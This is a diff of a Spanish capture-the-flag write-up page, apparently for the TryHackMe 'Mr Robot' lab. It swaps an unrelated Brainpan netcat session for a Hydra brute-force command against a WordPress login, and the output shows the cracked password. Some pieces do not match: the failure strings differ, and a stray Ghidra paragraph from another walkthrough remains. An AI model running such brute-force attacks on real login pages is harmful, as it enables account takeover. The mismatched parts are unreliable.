@@ -214,21 +214,10 @@ realizar un ataque de fuerza bruta haciendo que vaya descartando nombres de usua
 
 <p class="plain-text">Vemos que el usuario <code class="language-plaintext highlighter-rouge">Elliot</code> ha sido verificado, a continuación vamos a probarlo en el login.</p>
 <a href="/thm/mrrobot/8.png" target="_blank"><div><p><img src="/thm/mrrobot/8.png"></p></div></a>
-
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ netcat </span><span class="p">192.168.100.5 9999
-_|                            _|                                        
-_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
-_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
-_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
-_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
-                                            _|                          
-                                            _|
-
-[________________________ WELCOME TO BRAINPAN _________________________]  
-                          ENTER THE PASSWORD                              
-
-                          >></span>
+<p class="plain-text">Vaya, parece que efectivamente el usuario existe y podemos ver que el mensaje de error esta vez es diferente. A continuación vamos a volver a lanzar el comando <code class="language-plaintext highlighter-rouge">Hydra</code>pero adaptándolo al nuevo usuario y al nuevo mensaje.</p>
+<code><span class="ve">> sudo hydra </span><span class="am">-l Elliot -P /root/fsocity.dic 10.10.0.164 </span><span class="az">http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered </span>-t 30</span>
+<span class="plain-text">[DATA] attacking http-post-form://10.10.0.164:80/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username</span>
+<span class="plain-text">[<span class="ve">80</span>][<span class="ve">http-post-form</span>] host: <span class="ve">10.10.0.164</span>  login: <span class="ve">Elliot</span>  password: <span class="ve">ER28-0652</span></span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Ya que esta corriendo en la máquina victima analizemos el ejecutable con <code class="language-plaintext highlighter-rouge">ghidra</code>, donde vemos la función <code class="language-plaintext highlighter-rouge">_main</code> y haciendo clic en ella vemos su código <code class="language-plaintext highlighter-rouge">c</code></p>
